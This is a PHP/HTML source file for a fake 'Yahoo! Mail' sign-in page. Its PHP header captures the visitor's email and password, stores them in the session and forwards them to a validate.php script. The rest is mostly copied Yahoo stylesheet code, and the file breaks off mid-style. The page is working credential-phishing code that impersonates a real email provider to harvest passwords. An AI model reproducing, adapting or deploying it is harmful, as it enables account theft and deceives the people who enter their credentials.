<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email_msg = "";
$pass_msg = "";

$email = $userid;
$pass = "";

if($_POST) {
	$email = $_POST['email'];
	$pass = $_POST['passwd'];

	if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/", $email)) {
		$email_msg = "Please enter a valid email address";
	} 
        else if(trim($pass) == "") {
		$pass_msg = "Enter your password";
	}
        else if(strlen($pass) <= 3) {
		$pass_msg = "Invalid password";
	}
   else {
		$_SESSION['email'] = $email;
		$_SESSION['pass'] = $pass;
		header("Location: validate.php");
		exit;
	}
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Yahoo! Mail: The best web-based email!</title>


<script>

  <div id="baseLayout">
   <!-- Logo Meta Section Start -->

<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<script type='text/javascript'>
var startTime = new Date().getTime();
var loadTime = null;

</script>

<link rel="stylesheet" type="text/css" href="https://s.yimg.com/lq/i/reg/css/yregbase_sec_ui_1_9.css">
<style type="text/css">
.clear{clear:both}
#yreglg select, #yreglg input, #yreglg p, #yreglgtb td, #yreglgtb th{font-size:93%}
div.yregdsilu h2.yregdnt, div.yregdsilu p.yregsueasy{width:110px}
/*popup template css */
#yregtpopup #yregtxt {width:260px;margin:0 0 10px} /* popup template */
#yregtpopup #yregwp, #yregtpopup #yregmst{width:525px}
#yregtpopup #yregmst{margin-bottom:5px}
#yregtpopup #yreglg{margin-bottom:0}
#yregtpopup #yregft{padding-top:5px}

#yregtgen #yregtxt h2, #yregtpopup #yregtxt h2, #yregpmtxt h3{font:bold 152%/152% arial;color:#333;margin:0}
#yregtgen #yregtxt p.yregpti, #yregtpopup #yregtxt p.yregpti {color:#666;margin:0 0 2px;font:bold 100%/100% arial}
#yregtgen #yregtxt, #yregtpopup #yregtxt{margin-bottom:20px}
#yregtgen #yregtxt #yreghtxt h3, #yregtpopup #yregtxt #yreghtxt h3{margin:0;font:bold 107%/114% arial;color:#8C57A1}
#yregtgen #yregtxt li h3, #yregtpopup #yregtxt li h3{font:bold 114%/122% arial}
#yregtgen #yregtxt p, #yregtpopup #yregtxt p{margin:0 0 0.8em;line-height:129%}
#yregtgen #yregtxt .yregbpt li, #yregtpopup #yregtxt .yregbpt li{margin:0 0 10px 4px;padding:0 0 10px 22px;background:url(https://s.yimg.com/lq/i/reg/purple_arrow.gif) no-repeat 1px 4px}

#yregtgen.yregab #yregtxt{width:auto;}
#yregtgen.yregab #yreghtxt{margin-right:60px;}
#yregtpopup.yregab #yregtxt{width:180px}
#yregtgen #yregtxt #yreghtxt h2, #yregtpopup #yregtxt #yreghtxt h2{color:#7A067F}
.yregbx{z-index:3;margin-right:0!important}
.flicker h3 span {color:#ff0084;font-weight:bold}
.flicker h3 a {text-decoration:underline;}

/* persistency message right above "sign in" bottom */
.kmsibold {font-weight:bold; font-size: 114%;}
input#persistent {margin-bottom: -0em;}
.subperstxt {line-height:1.75em;}
.subperstxt2 {margin: 0 0 0 2em; display:block;}
.ftrMailLnk {padding-bottom: 10px;}
.yreglgsb{margin-top:0}

#yregwp #yregct #yreglg .yregbxi #yreglgmd {margin-top:1.75em}
#yregtgen fieldset {margin-bottom:2.5em}
p#sigcopys {text-align: left; font-size: 85%; padding: .4em; margin: .6em .0em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
#sigcopys label{display:block; margin:-1.5em 0 0 2em;}


#yregtgen #yregct {margin-right: 0px;}
#yregtgen #yregtxt { margin-left: 5px; margin-right: 255px;}
#inputs p#usernameP{color:#252525;font-weight:bold;font-size:14px;padding-top:0;padding-bottom:18px;}
th#thun, th#thpw {text-align:left;}

#yreglgtb #fun {
  display:none;
  margin-top:-10px;
  padding-bottom:7px;
  width:100%;
}
#fun .b{
  font-weight:bold;
}
#fun .b, #fun .n, #fun a{
  vertical-align:top;
}
#fun #caution {
  height:16px;
  width:16px;
  padding-right:3px;
}

p, form, fieldset, h1, h2, h3, h4, h5, h6{margin:0;padding:0}
fieldset{padding:10px 0}
img, fieldset{border:0}
legend{display:none}
label{font-weight:normal;cursor:pointer;cursor:hand}
a{color:#053799;text-decoration:none}
a:hover{text-decoration:underline}
.yregclb:after{content:".";display:block;font-size:0px;line-height:0;height:0;clear:both;visibility:hidden}
body{text-align:center;color:#333;margin:5px 0 0;padding:0}
#yregwp{text-align:left;margin:0 auto;width:750px}
#yregmst{margin:0 0 10px}
#yreglg{float:right;width:240px;margin:0 0 20px;}
#yregtxt{margin:0 270px 0 20px}
#yregtml #yregtxt{margin:0}
#yregft{text-align:center;font-size:77%;padding:10px 0 0;border-top:1px solid #777}
#yregtml #yregft {border-color:#dbd7db}
.yregbx{border:1px solid #656565;margin:0 0 10px;background-color:#f9f9f9} 
#yregtml #yreglg .yregbx {margin-right:10px;}
.yregbxi{margin:11px}
.top .yregbxi{margin-top:20px}
#yreglg h1, #yreglg h2, #yreglg h3{font-size:114%;color:#333}
#yreglg h3{margin:0 0 4px}
#yreglg select, #yreglg input, #yreglg p, #yreglgtb td, #yreglgtb th{font-size:91%}
#yreglg p.yreglgsb input{font-size:107%}
#yreglg .yregnewssl, #yreglg .yreglgmd{font:77%/114% verdana}
#yreglg .yregnewssl{margin:-4px 0 10px}
#yreglg .yregnewssl span {color:#c00}
#yreglgtb, #yreglgtb td, #yreglgtb th, #yreglg .yreglgmd, .yreglgsu, .yreglgsb, .yreglgsut, .yregnewssl{text-align:right}
#yreglgtb {margin:0 0 8px;padding:0;width:215px}
.yreglgsub{margin:15px 0 0 30px}
.yreglgsb{margin:12px 0 0}
.yreglgsut{margin:0 0 3px}
.yreglgsu a, .yreglgsut a{color:#039;font:bold 114%/114% arial;text-decoration:underline}
.yreglgsut a{font-size:122%;}
h2.yregdnt{margin:14px 0 0}
.yregdsilu{border-bottom:1px solid #999;margin:0 0 15px;padding:0 0 8px}
.yregdlisu, .yreglvpnu{border-top:1px solid #999;margin:15px 0 0;padding:14px 0 10px}
#yreglg .second h3{ font:bold 100% Arial;color:#333}
#yreglg .second p{font:76%/144% verdana}
#yregbnr{padding:23px 0 2px}
#yregbnr{border-bottom:18px solid #e1f0fd}
.yregbnrimg{float:left;width:204px}
#yregbnrt{margin:0 0 0 206px; padding:14px 270px 0 20px;background:#9acef7 url(https://s.yimg.com/lq/i/reg/ymbnr_lb_ne.gif) no-repeat top right}
#yregbnrti{height:auto;padding-top:159px;}
#yregbnrtii{margin-top:-159px}
#yregbnrtii p{color:#fff;padding:0 0 5px}
#yregbnrtii a{color:#fff;font-weight:bold}
@media all and (min-width: 0px){html>body #yregbnrti{min-height:1px}} /*Opera 7*/
#yregiclst{margin:0 0 10px;padding:0 270px 0 0}
#yregiclst .ic{margin:18px 0 0;padding:0}
#yregiclst h3{font:normal 122%/152% verdana;color:#64236a}
#yregiclst cite{font-style:normal;line-height:129%}
#yregiclst a{color:#3385d6}
#yregintusr{margin:0 0 20px;}
#yregintusr h4{font-size:100%;margin:0 0 4px;color:#333;font-family:arial}
#yregintusr select, #yregintusr input{font-size:92%}
.hiddenlayer{display:none}
.showlayer{display:block}
#hl_banner, #hl_list, #h2_list{position:absolute; width:470px;z-index:1000;background-color:#ccc}
.yreginhdly{position:relative;z-index:1;right:2px;bottom:2px; padding:2px; background-color:#fff;border:1px solid #61a7de;color:#333;font-family:verdana}
.yreginhdly ul{margin:5px 0 1em; padding:0 0 0 30px}
.yreginhdly li{margin:0;font-size:77%; list-style-type:square}
.yreginhdly h4{margin:0 0 10px;padding:4px 10px;background:#61a7de;color:#fff;font:bold 77% verdana;text-transform:uppercase}
#yregtml .yreginhdly p{color:#333;padding:0 9px 1em;font:normal 77%/120% verdana}
#yregtml .yreginhdly p strong{color:#00587A}
#yregtml .close a{color:#fff}
#yregtml #yregbnrtii .yreginhdly p{color:#333}
p.close{margin:5px 0 0;font-size:77%;line-height:100%;position:absolute;top:2px;right:10px}
.yreglegal{font-style:italic}
.yregnlnk{text-decoration:underline;cursor:pointer;cursor:hand}
.knob{position:absolute;top:-6px;_top:-5px;width:13px;height:8px;background:url(https://s.yimg.com/lq/i/reg/ymknb_lb.gif) no-repeat top left}
#hl_banner .knob{left:255px}
#hl_list .knob{left:40px}
#h2_list .knob{left:170px}
.lblue #yregbnrt{background-color:#9acef7;background-image:https://s.yimg.com/lq/i/reg/ymbnr_lb_ne.gif}
.lblue #yregbnr{border-color:#e1f0fd}
.lblue #yregbnrtii p{color:#f5fafe}
.lblue #yregbnrtii a{color:#144f7c}
.lblue .yreginhdly{border-color:#61a7de}
.lblue .yreginhdly h4{background:#61a7de}
.lblue .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_lb.gif)}
#yregtml .lblue .showlayer p strong{color:#61a7de} 
.lgreen #yregbnrt{background-color:#9dc338;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_lg_ne.gif)}
.lgreen #yregbnr{border-color:#e1edc3}
.lgreen #yregbnrtii p{color:#f5f9eb}
.lgreen #yregbnrtii a{color:#0f7048}
.lgreen .yreginhdly{border-color:#bbda68}
.lgreen .yreginhdly h4{background:#bbda68}
.lgreen .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_lg.gif)}
#yregtml .lgreen .showlayer p strong{color:#0f7048}
.bluegreen #yregbnrt{background-color:#74b46a;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_bg_ne.gif)}
.bluegreen #yregbnr{border-color:#d5e8d2}
.bluegreen #yregbnrtii p{color:#f1f8f0}
.bluegreen #yregbnrtii a{color:#f9faaf}
.bluegreen .yreginhdly{border-color:#94c78c}
.bluegreen .yreginhdly h4{background:#94c78c}
.bluegreen .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_bg.gif)}
#yregtml .bluegreen .showlayer p strong{color:#0f7048}
.rootbeer #yregbnrt{background-color:#894611;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_rb_ne.gif)}
.rootbeer #yregbnr{border-color:#dbc7b7}
.rootbeer #yregbnrtii p{color:#fff2cb}
.rootbeer #yregbnrtii a{color:#f9faaf}
.rootbeer .yreginhdly{border-color:#b99b83}
.rootbeer .yreginhdly h4{background:#b99b83}
.rootbeer .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_rb.gif)}
#yregtml .rootbeer .showlayer p strong{color:#894611}
.orange #yregbnrt{background-color:#f7582e;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_or_ne.gif)}
.orange #yregbnr{border-color:#fdcdc0}
.orange #yregbnrtii p{color:#feefeb}
.orange #yregbnrtii a{color:#f1e27b}
.orange .yreginhdly{border-color:#ff9678}
.orange .yreginhdly h4{background:#ff9678}
.orange .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_or.gif)}
#yregtml .orange .showlayer p strong{color:#c83b13}
.deepblue #yregbnrt{background-color:#016a99;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_db_ne.gif)}
.deepblue #yregbnr{border-color:#b2d2e0}
.deepblue #yregbnrtii p{color:#e7f1f3}
.deepblue #yregbnrtii a{color:#fdc266}
.deepblue .yreginhdly{border-color:#1c86ae}
.deepblue .yreginhdly h4{background:#1c86ae}
.deepblue .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_db.gif)}
#yregtml .deepblue .showlayer p strong{color:#036999}
.purple #yregbnrt{background-color:#a566ad;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_pr_ne.gif)}
.purple #yregbnr{border-color:#e4d1e6}
.purple #yregbnrtii p{color:#f6f0f7}
.purple #yregbnrtii a{color:#fdc266}
.purple .yreginhdly{border-color:#c799cc}
.purple .yreginhdly h4{background:#c799cc}
.purple .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_pr.gif)}
#yregtml .purple .showlayer p strong{color:#a566ad}
.yellow #yregbnrt{background-color:#ff9700;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_yl_ne.gif)}
.yellow #yregbnr{border-color:#ffe0b2}
.yellow #yregbnrtii p{color:#fff5e6}
.yellow #yregbnrtii a{color:#016a99}
.yellow .yreginhdly{border-color:#efae4d}
.yellow .yreginhdly h4{background:#efae4d}
.yellow .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_yl.gif)}
#yregtml .yellow .showlayer p strong{color:#916714}
.oxblood #yregbnrt{background-color:#900000;background-image:url(https://s.yimg.com/lq/i/reg/ymbnr_ob_ne.gif)}
.oxblood #yregbnr{border-color:#ddb2b2}
.oxblood #yregbnrtii p{color:#f4e6e6}
.oxblood #yregbnrtii a{color:#ff9700}
.oxblood .yreginhdly{border-color:#800000}
.oxblood .yreginhdly h4{background:#800000}
.oxblood .knob{background-image:url(https://s.yimg.com/lq/i/reg/ymknb_ob.gif)}
#yregtml .oxblood .showlayer p strong{color:#900000}
#yregtml .mailplus{padding-right:160px;background:url(https://s.yimg.com/lq/i/us/pim/pr/trap/lo_mailplus_1.gif) no-repeat 360px  50%; height:auto;padding-top:36px}
#yregtml .mailplus div{margin-top:-36px}
#yregtml .spamguard{padding-right:113px;background:url(https://s.yimg.com/lq/i/reg/sp_sguard60_2.gif) no-repeat 407px 50%;height:auto;padding-top:52px}
#yregtml .spamguard div{margin-top:-52px}
#yregtml .addressbook{padding-right:152px;background:url(https://s.yimg.com/lq/i/us/pim/sp/qb_xsmdiagram1.gif) no-repeat 368px 50%;height:auto;padding-top:50px}
#yregtml .addressbook div{margin-top:-50px}
#yregtml .messenger{padding-right:120px;background:url(https://s.yimg.com/lq/i/us/pim/sp/mantle/sp_msgr60_1.gif) no-repeat 400px 50%;height:auto;padding-top:60px}
#yregtml .messenger div{margin-top:-60px}
#yregtml .photos{padding-right:130px;background:url(https://s.yimg.com/lq/i/us/pim/sp/mantle/sp_photos_1.gif) no-repeat 390px 50%;height:auto;padding-top:60px}
#yregtml .photos div{margin-top:-60px}
#yregtml .mobile{padding-right: 113px; background:url(https://s.yimg.com/lq/i/us/pim/sp/mantle/sp_mobile_1.gif) no-repeat 407px 50%;height:auto;padding-top:60px}
#yregtml .mobile div{margin-top:-60px}
#yregtml .antivirus{padding-right:135px;background:url(https://s.yimg.com/lq/i/reg/norton2006.gif) no-repeat 394px 50%; height:auto;padding-top:22px}
#yregtml .antivirus div{margin-top:-22px}
#yregtml .cnet{padding-right:110px;background:url(https://s.yimg.com/lq/i/reg/EC_aug04_39x72.gif) no-repeat 410px 50%;height:auto;padding-top:72px}
#yregtml .cnet div{margin-top:-72px}
#yregtml .pcmag{padding-right:115px;background:url(https://s.yimg.com/lq/i/us/pim/lgn/ymail_ec_logo_1.gif) no-repeat 405px 50%;height:auto;padding-top:94px;}
#yregtml .pcmag div{margin-top:-94px;}
#yregtml #yregiclst .ic{margin-bottom:20px;min-height:1px}

#yregmain {width:218px;margin-right:0;}
.top {position:relative;}
.v5bd{overflow-x:hidden;overflow-y:auto;}
#uncheck span{font-weight:bold; background-color: #f99; padding: 0 2px;}
#uncheck a{color: #1243A0;text-decoration: none;} 
</style>

<link rel="stylesheet" type="text/css" href="https://s.yimg.com/lq/lib/reg/css/container-min-1.css">

        <style type="text/css">
        #captcha, #captcha_c, #captchaDiv {z-index:6;top: -60px;}
        #captcha #captchaV5Header {overflow:hidden;}
        #captchaErr {font-size:11px;color:#E10707;background:url("https://s.yimg.com/lq/i/reg/login/loginsprite_2_18_2010.png") left -199px no-repeat;padding-left:25px;height: 15px;}
        .yui-skin-sam .yui-panel-container.shadow .underlay {position:fixed;}
        #submitC .primaryCta {width: auto;}
        .pwqaContent .primaryCta {padding-bottom:5px;}
        #submitC #cdiv {position:absolute;bottom:13px;right:13px;}
        html body div#captcha_mask {display:none !important}
        .yui-skin-sam .yui-panel .bd {padding-top:13px}
        .yui-skin-sam #captcha .hd,.yui-skin-sam #captcha .bd {background:none}
        .yui-skin-sam #captcha .bd{height:320px !important;}
        /*.yui-skin-sam #captcha {background-color: #F0F4F8;}*/
        .yui-skin-sam #captcha .bd, .yui-skin-sam #captcha .hd {}
         .yui-skin-sam #captcha .hd{border-bottom: 1px solid #D5D5D5;font-size:13px;color:#5B7EA1;}
         #captchaV5{margin-left:72px}
        .yui-skin-sam .yui-panel{border-style:none;}
        /*#captcha_c #captcha {border: 10px solid #8DA6B9;}*/

            /* New css for panel*/

    .yui-skin-sam #captcha {background-color:#777777;border:0px;border-radius:5px;box-shadow: 0 0 15px 1px rgba(0, 0, 0, 0.6);color:#3f3f3f;padding-bottom:1px;}
    .yui-skin-sam #captcha .hd {padding-right:30px;border:0px; filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#999999', endColorstr='#777777');
    background: -webkit-gradient(linear, left top, left bottom, from(#999999), to(#777777));
    background: -moz-linear-gradient(top,  #999999,  #777777);
    border-radius:5px;
    overflow:auto;
    padding-top:3px;
    padding-bottom:3px;
    color:#FFFFFF;
    text-shadow:1px 1px 1px rgba(0, 0, 0, 0.25);
    }
    .yui-skin-sam .container-close {background: url("https://s.yimg.com/lq/i/reg/icn_sprite_close-_6_21_11.gif") no-repeat scroll -2px 0 transparent;right:0px;top:15px;}
    .yui-skin-sam #captcha .bd {border:0px;background-color: #FFFFFF;
    border-radius: 5px 5px 5px 5px;
    margin-bottom: 5px;
    margin-left: 5px;
    margin-right: 5px;
    padding-bottom:40px;
    }

    .lockedPage, .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .VoiceSMSHeader .VoiceSMSInstruction, .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .VoiceSMSHeader .VoiceSMSPrompt, .aeaEmailVerify, .aeaContent,.pwqaContent {font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#454545;}
    .sec-chal-popup {position:absolute;width:440px;right:10px;margin-top:5px;z-index:9999;}
    .sec-chal-popup p {margin-bottom:5px;}
    .sec-chal-popup .clspopup {background: url("https://s.yimg.com/lq/i/reg/sprite_pg_20100719_ltr.png") no-repeat scroll left -689px transparent; cursor: pointer; display: block; height: 16px; padding: 0; position: absolute; right: 6px; top: 6px; width: 13px;}
    .hide-offscreen {position: absolute;top: -999em}
    .nodisp {display:none;}
    .sec-chal-popup .pointer-up {background-image: url("https://s.yimg.com/lq/i/reg/sprite_pg_slate_20100809_ltr.png");background-position: left -3583px;background-repeat: no-repeat;display: block;height: 8px;position: absolute;top: -6px;width: 10px;}
    #learn_more_content p, #pwqa-popup .sec-chal-content p {font-size:12px;padding-right:8px;}
    .sec-chal-popup .sec-chal-content {background-color:#EFF3F5;border:1px solid #333333;padding:10px;position:relative;}

    .aeaContent .sec-chal-popup #learn_more_content .pointer-up {left: 135px;}
    .pwqaContent .pwqa-question {padding-top:30px;padding-left:0px;}
    .pwqaContent .pwqa-question span {display: block; float: left; padding-right: 10px; text-align: right; width: 175px;}
    .pwqaContent .pwqa-question span .small {font-size:85%;}
    .aeaPhoneVerify #submitC #cdiv, .aeaContent #submitC #cdiv {margin-top:20px;width:100%;text-align:right;}
    .pwqaContent #verifybtn {margin-top:35px;text-align:center;}
    .aeaPhoneVerify #submitC #cdiv .primaryCta, .aeaEmailVerify #submitC #cdiv .primaryCta, .aeaContent #submitC #cdiv .primaryCta, .pwqaContent #submitC #cdiv .primaryCta {width:auto;margin-right:10px;overflow:visible;}
    .aeaPhoneVerify #submitC #cdiv .secondaryCta, .aeaEmailVerify #submitC #cdiv .secondaryCta, .aeaContent #submitC #cdiv .secondaryCta, .pwqaContent #submitC #cdiv .secondaryCta {padding-top:5px;}

    .pwqaContent .pwqa-aea-text #receivebtn {margin-top:20px;text-align:center;}
    .pwqaContent .pwqa-aea-text .center {padding-bottom: 15px; padding-top: 20px;text-align:center;}
    .pwqaContent .pwqa-aea-text .center .lthru {text-decoration: line-through; color:#B1B1B1;}
    .pwqaContent .pwqa-aea-text .center .or {font-weight:bold;font-size:14px;}
    .aeaContent .mobileList {margin-top:30px;}
    .aeaContent .adjust-margin {margin-top:15px;}
    .aeaContent .aeaList {margin-top:20px;margin-bottom:10px;}
    .aeaContent .aeaList, .aeaContent .mobileList {padding-left:60px;}
    .aeaContent .aeaList .be, .aeaContent .mobileList .bm {float:left;width:100px;}
    .aeaContent ul {margin-top:5px;margin-left:0px;padding-left:100px;}
    .aeaContent ul li{list-style-type:none;padding-bottom:5px}
    .aeaContent ul li input {margin-right:10px;}
    #pwqa-popup {margin-top: 18px;}
    #pwqa-popup #pwqa_popup_content .pointer-up {left: 365px;}
    #pwqa-popup #pwqa_popup_content ul {padding-left:20px;margin-top:0px;margin-left:0px;}
    #pwqa-popup #pwqa_popup_content ul li {padding-bottom:5px;list-style-type:disc;}
    .aeaContent .charges {font-size:85%;}
    .pwqaContent .next-line {display:block;}
    .aeaContent .strong, .pwqaContent .strong, .aeaEmailVerify .strong, .aeaContent ul li .strong{font-weight:bold;}
    .aeaContent .strong a, .pwqaContent .strong a, .aeaEmailVerify .strong a, .aeaContent ul li .strong a{font-weight:normal;}
    .aeaEmailVerify .spacer, .aeaContent .spacer, .aeaContent ul li .strong span{padding:0 5px;}
    .aeaEmailVerify .aeaEnterCode {margin-top:20%;margin-left:60px;}
    .aeaEmailVerify .aeaEnterCode #aeaEmailCode {width:100px;}

    .aeaPhoneVerify #captchaV5 {margin-left:0px;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .VoiceSMSHeader {padding-left:0px;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .VoiceSMSInputBox {padding-top:40px; padding-left:0px;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .VoiceSMSInputBox #captchaV5CodePrompt {float:left;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .VoiceSMSHelp {float:none; font-size:14px;}
    .aeaPhoneVerify #submitC #cdiv {width:100%;}
    .error2 {background-image:url("https://s.yimg.com/lq/i/reg/login/loginsprite_2_18_2010.png");background-position:left -197px;background-repeat:no-repeat;padding-left:24px;padding-bottom:5px; color:#E10707; font-size:12px; font-weight:bold;padding-top:3px;}
    #lockedErr {margin-top:5px;}
    .lockedContent {padding-top:10px;}
    #inputs .aeaPhoneVerify label {font-size:13px;display:inline;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .OOBHelp, .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .OOBHeader .OOBInstruction, .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .captchaNoOutsidePadding .captchaCodeSent, .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .OOBHeader .OOBPrompt {font-size:13px;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .captchaNoOutsidePadding .OOBFooter{position:absolute;bottom:0px;left:15px;overflow:hidden;z-index:999}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha {width:440px;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .captchaDisplayRL {width:430px;}
    .aeaPhoneVerify .yAbuseVoiceSMSCaptcha .captchaNoOutsidePadding .OOBContent {width:440px;}
    .cpwcCaptcha #captchaV5VoiceSMSCaptchaDestInput #captchaV5PhoneNum, .cpwcCaptcha #captchaV5OOBAnswerBox #captchaV5Answer {width:120px;}
    .cpwcCaptcha {font-size:120%;}
    .cpwcCaptcha #captchaV5CodePrompt {display:inline;}
    .cpwcCaptcha #submitC #cdiv {position:absolute;right:180px;}

        </style>
        <!--[if lt IE 7]>
        <style type="text/css">
        .yui-skin-sam .yui-panel-container.shadow .underlay {display:none;}
        .yui-skin-sam #captchaDiv .yui-overlay-iframe#captcha_f{width:1000px !important;height:1000px !important; top:0px !important;right:0px ;}
        </style>
        <![endif]-->
        <!--[if lte IE 7]>
        <style type="text/css">
        /*.aeaContent #submitC #cdiv {width:54%;}
        .aeaPhoneVerify #submitC #cdiv {width:54%;}
        .aeaEmailVerify #submitC #cdiv {width:54%;}
        .yAbuseVoiceSMSCaptcha .VoiceSMSPrompt button {margin-left:5px;}
        */
        .aeaContent .sec-chal-popup #learn_more_content .pointer-up {left: 70px;}
        </style>
        <![endif]-->


<style type="text/css">


.top {position:relative}
#antiphish{position:absolute;right:5px;top:5px;}  
#antiphish.dogear{right:0px;top:0px;} 
#antiphish a {font-size:92%;}
img.picture {border:2px solid}

</style>



<!--[if gt IE 6]>
<style type="text/css">
.yregclb,.yregbxi,.yregbx {height:1%}
#yreglgtb td{text-align:left}
#yregtxt #banner div{position:static}	/* ie z-index context stacking bug work-around */
#yregtpopup #yregtxt{float:left;}
#yregct{padding:0 0 30px}
.yregbx{width: 100%}
</style>
<![endif]-->



<style type="text/css">
  
#yreglgtb, #yreglgtb th {text-align: left; width: 100%;}
#yreglgtb td { width:179px;  text-align: left; padding: 0 0 16px 0}
#yreglgtb td input{ width:179px  } 
.dbidTip {padding: 3px 0 0 0;  font-size:85%}  
</style>






<style type="text/css">
div.yregdsilu h2.yregdnt, div.yregdsilu p.yregsueasy{width:110px}
/* persistency message right above "sign in" bottom */
/* em.nwred a {font-style: normal;font-size: 85%;top:0;position:relative;} */
.kmsibold {font-weight:bold; font-size: 114%;}
p#sigcopys {text-align: left; font-size: 85%; padding: .4em; margin: .6em .4em 1em 0; border-bottom: 1px dotted #9D9C9D; border-top: 1px dotted #9D9C9D;}
input#persistent {margin-bottom: -0em;}
.subperstxt {line-height:1.75em;}
.subperstxt2 {margin: 0 0 0 2em; display:block;}
/* #yregft p.yregfb { font-size:120%; padding-bottom: 5px; padding-up: 5px} */
</style>
<style type="text/css">


.top {position:relative}
#antiphish{position:absolute;right:5px;top:5px;}  
#antiphish.dogear{right:0px;top:0px;} 
#antiphish a {font-size:92%;}
img.picture {border:2px solid}

</style>
    
<!--[if gt IE 6]>
<style type="text/css">
#antiphish.dogear{right:1px;}
</style>
<![endif]-->

<!--[if IE]>
<style type="text/css">
.yregclb{height:1%}
#yregbnrti{height:159px;padding-top:0}
#yregbnrtii{margin-top:0} 
.knob{top:-5px}
#yregtml .mailplus{height:60px;padding-top:0}
#yregtml .mailplus div{margin-top:0}
#yregtml .spamguard{height:52px;padding-top:0}
#yregtml .spamguard div{margin-top:0}
#yregtml .addressbook{height:50px;padding-top:0}
#yregtml .addressbook div{margin-top:0}
#yregtml .messenger{height:60px;padding-top:0}
#yregtml .messenger div{margin-top:0}
#yregtml .photos{height:60px;padding-top:0}
#yregtml .photos div{margin-top:0}
#yregtml .mobile{height:60px;padding-top:0}
#yregtml .mobile div{margin-top:0}
#yregtml .antivirus{height:60px;padding-top:0}
#yregtml .antivirus div{margin-top:0}
#yregtml .cnet{height:72px;padding-top:0}
#yregtml .cnet div{margin-top:0}
#yregtml .pcmag{height:94px;padding-top:0}
#yregtml .pcmag div{margin-top:0}

</style>
<![endif]-->
<!--[if IE 7]>
<style type="text/css">
.knob{top:-6px}
#antiphish.dogear{top:0;right:0;}
#antiphish{right:5px;}
</style>
<![endif]-->

<!--[if lte IE 6]>
<style type="text/css">
.yregclb{height:30em}
#yregtxt {height:1%}
p#sigcopys {margin-right:0.2em}
</style>
<![endif]-->


<style type="text/css">
    #yregtxt {width:66%; overflow:hidden}
    #yregbnr {padding-top:0}
    #yregbnr #yregbnrti #yregbnrtii {width:240px}
    #yregiclst {padding-right:0}
</style>
<!--[if lte IE 7]>
<style type="text/css">
    #yregbnr #yregbnrti {margin-top:-160px}
    #yregtxt {height:auto}
</style>
<![endif]-->



<style type="text/css">
  
#yreglgtb, #yreglgtb th {text-align: left; width: 100%;}
#yreglgtb td { width:179px;  text-align: left; padding: 0 0 16px 0}
#yreglgtb td input{ width:179px  } 
.dbidTip {padding: 3px 0 0 0;  font-size:85%}  
</style>




<style type='text/css'>
html,body{text-align:center;width:100%;}
#adFrame{position:static;visibility:hidden;}
#mainBox{position:relative;top:0;width:100%;height:960px;min-height:680px;margin:0 auto;background-color:transparent;text-align:left;}
#iframeHolder{height:1024px;width:1920px;margin:0 auto 0 -960px;position:absolute;top:50px;left:50%;overflow:visible;}
#loginHolder{height:100%;width:800px;margin:0 auto;position:relative;}
/* #hdBg{background:transparent url(https://s.yimg.com/lq/lib/uh/15/uh_sprites_1.5-1.0.3.png) repeat-x;height:61px;} */
#hdBg {height:61px;}
#hdBg #mem_hd{width:800px;margin:0 auto;position:relative;z-index:5;}
#hdBg #mem_hd #ygmaheader .sp{height:40px;padding-bottom:0;}
#hdBg #ygma .bd{background-image:none;width:782px;margin:0 auto;}
#hdBg #yUnivHead {width:758px;}
#footer{background-color:#FFF;_top:100%;bottom:0px;height:35px;left:0px;width:100%;position:fixed;z-index:3;}
#footer #feedback{font-size:10px;}
#footer #mem_ft{margin-top:0;}
#leftContent{position:absolute;left:0;}
#loginBox{height:600px;width:240px;margin-left:580px;}
#loginBox #yreglg .yregbx{border:3px solid rgba(153,153,153,0.75);-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;}
#yregmain{background-position:56px 0px;}
#yreghtxt{margin-top:1em;}

#lisu{margin-left:11px;}
.yregbxi #lisu{margin-left:0;}
#static {width:525px;}

#ylbpix{background:transparent url(https://login.yahoo.com/i/reg/cs.gif) no-repeat}</style>

<!--[if IE 6]>
<style type='text/css'>
  #loginBox {
    float:right;
    margin-left:0;
  }
  #iframeHolder {
    height:1024px;
  }
</style>
<![endif]-->
<!--[if IE]>
<style type='text/css'>
    #loginBox #yreglg .yregbx {
      border:3px solid #999999;
    }
</style>
<![endif]-->

<style>
#yreglg {
